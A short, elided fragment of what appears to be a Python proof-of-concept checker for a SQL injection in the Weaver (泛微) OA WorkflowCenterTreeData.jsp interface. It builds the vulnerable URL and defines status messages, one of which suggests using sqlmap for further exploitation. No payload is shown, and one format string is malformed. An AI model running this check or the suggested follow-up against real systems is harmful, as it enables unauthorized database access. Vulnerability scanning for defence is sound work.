...
def main(target_url):
    ...
    if target_url[-1] != '/':
        target_url += '/'
    target = target_url + 'mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333'
    ...
    success_msg = now_time() + '[SUCCESS]目标为oracle数据库'
    shell_msg = now_time() + '可利用sqlmap进行进一步利用: {}".format(target)'
    warning_msg = now_time() + '[WARNING]不存在泛微OA WorkflowCenterTreeData接口SQL注入'
    error_msg = now_time() + '[泛微OA WorkflowCenterTreeData接口SQL注入][ERROR]目标请求失败'
    try:
